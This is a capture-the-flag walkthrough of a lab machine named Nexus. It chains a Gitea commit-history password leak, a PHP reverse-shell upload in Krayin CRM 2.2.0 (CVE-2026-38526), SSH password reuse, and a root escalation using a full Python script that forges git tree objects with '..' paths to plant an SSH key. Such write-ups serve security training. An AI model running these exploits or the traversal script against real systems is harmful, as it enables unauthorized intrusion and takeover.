# Nexus

* **OS:** Linux
* **Difficulty:** Easy
* **Chain:** `www-data` → `jones` → `root`

### Summary

Exposed Gitea repo (`krayin-docker-setup`) leaks a password in its commit history and points to the `billing` vhost running **Krayin CRM 2.2.0**, vulnerable to **CVE-2026-38526** (arbitrary PHP upload via the email composer → `www-data` shell). The CRM's `.env` leaks a password reused by local user `jones` for SSH. Root falls to a **Gitea template-sync service** that runs `os.path.join()` on raw `git ls-tree` paths without sanitising `..`, letting a crafted template repo write an SSH key to `/root/.ssh/authorized_keys`.

***

### Enumeration

#### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV $IP
```

```
22/tcp open ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Two ports. Port 80 redirects to `nexus.htb` — add it to hosts:

```bash
echo "$IP nexus.htb" | sudo tee -a /etc/hosts
```

#### Web

The site is a government-style energy authority. The **Careers** section has a job posting ("Operations Specialist – Customer Platforms") exposing two emails:

* `careers@nexus.htb`
* `j.matthew@nexus.htb` ← hiring manager, keep this

#### Subdomain fuzzing

Everything returns the same 4-word 302, so filter it out with `-fw 4`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FFUZ \
     -u http://nexus.htb/ -H "Host: FFUZ.nexus.htb" -fw 4
```

```
git     [Status: 200, Size: 14879, ...]
billing [Status: 302, Size: 390, ...]
```

```bash
echo "$IP git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

***

### Foothold — www-data

#### Gitea credential leak

`git.nexus.htb` is a Gitea instance. The repo **`admin/krayin-docker-setup`** has an exposed `.env` referencing `billing.nexus.htb`. The current `.env` password is blanked — but the **commit history** restores it:

```
DB_PASSWORD=N27xh!!2ucY04
```

Visit `billing.nexus.htb` → **Krayin CRM** login, version **2.2.0**.

Log in with the hiring-manager email + the leaked password:

* **User:** `j.matthew@nexus.htb`
* **Pass:** `N27xh!!2ucY04`

#### CVE-2026-38526 — PHP upload via email composer

Krayin 2.2.0 lets an authenticated user attach files in the email composer without proper type enforcement.

1.  Prepare a PHP reverse shell (e.g. pentestmonkey) — set your IP/port:

    ```php
    $ip   = '10.10.14.x';   // CHANGE
    $port = 4455;           // CHANGE
    ```
2. Mail → **Compose** → attach the shell as `.png`.
3. Intercept the upload in **Burp**, rename `filename="...png"` → `filename="...php"`, forward.
4.  Note the stored path in the response, e.g.:

    ```
    http://billing.nexus.htb/storage/tinymce/<hash>.php
    ```
5.  Start a listener and trigger it:

    ```bash
    nc -lnvp 4455
    curl http://billing.nexus.htb/storage/tinymce/<hash>.php
    ```

Shell lands as `www-data`. Stabilise:

```bash
script /dev/null -c /bin/bash
```

***

### Lateral movement — jones

Krayin's `.env` leaks the DB creds and `/etc/passwd` shows a real user:

```bash
cat ~/krayin/.env | grep DB_
# DB_PASSWORD=y27xb3ha!!74GbR

grep bash /etc/passwd
# jones:x:1000:1000:...:/home/jones:/bin/bash
```

Password reuse — SSH in:

```bash
ssh jones@nexus.htb        # y27xb3ha!!74GbR
cat /home/jones/user.txt
```

***

### Privilege escalation — root

#### The vulnerable service

```bash
systemctl list-timers | grep gitea
# gitea-template-sync.timer  → every 2 min
```

Read `/etc/gitea/template-sync.py`. It clones every repo flagged as a **template** and syncs each file to `/home/git/template-staging/<owner>/<repo>/`. The flaw:

```python
target = os.path.join(stage_path, filepath)   # filepath comes raw from `git ls-tree`
os.makedirs(os.path.dirname(target), exist_ok=True)
```

`git ls-tree` emits whatever path the tree objects encode — including `..` — and `os.path.join` doesn't collapse `..`. The kernel resolves it on write, so a tree entry named `../../../../../root/.ssh/authorized_keys` escapes the staging dir and writes into `/root`.

#### Why raw git objects are needed

Normal git (`add` / `write-tree` / `checkout`) runs `verify_path()`, which rejects any path component equal to `..`, `.`, or `.git`. That check lives in the porcelain, **not** in the object store. By writing loose objects straight into `.git/objects/` and pushing the pack, you never trigger `verify_path()`, and Gitea stores the bytes without validating them.

Git encodes a path as nested trees: each slash is a new tree. To get `../../../../../root/.ssh/authorized_keys` you build trees whose entry _names_ are `..`, `root`, `.ssh`, and finally a blob `authorized_keys`. Five `..` are needed to climb `rce → jones → template-staging → git → home → /`.

#### Exploitation

**1. Key pair:**

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

**2. Gitea repo:** log into `git.nexus.htb` as `jones`, create repo **`rce`**, tick **"Make repository a template"** (required — only templates get synced).

**3. Clone and build the payload:**

```bash
cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
```

`build.py` (writes raw git objects with `..`-named trees):

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
if r.returncode != 0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''"); sys.exit(1)
key = r.stdout.strip() + "\n"

blob   = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t  = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur    = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir    = write_obj(entry("40000", "root", cur), "tree")
for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")
root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")

ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)
```

```bash
python3 build.py
git push -u origin main --force
```

**4. Wait for the timer (≤2 min)** and confirm on the box:

```bash
tail -f /var/log/template-sync.log
# [..] synced: ../../../../../root/.ssh/authorized_keys
```

**5. SSH as root:**

```bash
ssh -i /tmp/.k root@nexus.htb
cat /root/root.txt
```

***

### Key takeaways

* Always diff **commit history** — blanked secrets in the current tree are often live in older commits.
* Password reuse across service configs (`.env`) and local accounts is the whole lateral step.
* **Server-side path traversal via crafted git objects:** `verify_path()` guards local add/checkout only. Any service doing `os.path.join(base, path_from_git)` without sanitising `..` is exploitable — the object store and `ls-tree` won't stop you, and `os.path.join` never collapses `..`.
